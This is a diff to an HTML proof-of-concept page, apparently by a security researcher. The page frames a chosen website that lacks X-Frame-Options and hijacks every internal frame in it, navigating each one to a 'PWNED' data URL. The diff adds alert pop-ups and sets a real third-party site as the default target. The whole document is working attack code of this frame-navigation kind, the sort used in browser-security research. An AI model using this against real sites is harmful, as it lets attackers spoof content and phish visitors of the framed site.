@@ -3,18 +3,22 @@
     <script>
     var pwn_url = 'data:text/html,PWNED BY @homakov'
     var go = function(){
-      for(var i=0,l=frames[0].frames.length;i<l;i++){
+      for(var i=0, l=frames[0].frames.length;i<l;i++){
         frames[0].frames[i].location.replace(pwn_url);
       }
+      alert(l+' frames were replaced');
     }
     var load = function(){
       frames[0].location=target.value;
+      frames[0].onload=function(){
+        alert('now press PWN');
+      }
     }
     </script>
   </head>
   <body>
   	Just load URL w/o X-Frame-Options and containing some internal frames. I will pwn 'em. <br>
-    <input placeholder="Frameable URL" id="target"><a href="javascript:load()">LOAD</a> | <a href="javascript:go()">PWN INTERNAL FRAMES</a><br>
-    <iframe width="100%" height="50%" id="mng"></iframe>
+    <input placeholder="" value="http://9gag.com" id="target"><a href="javascript:load()">LOAD</a> | <a href="javascript:go()">PWN INTERNAL FRAMES</a><br>
+    <iframe width="100%" height="70%" id="mng"></iframe>
   </body>
 </html>
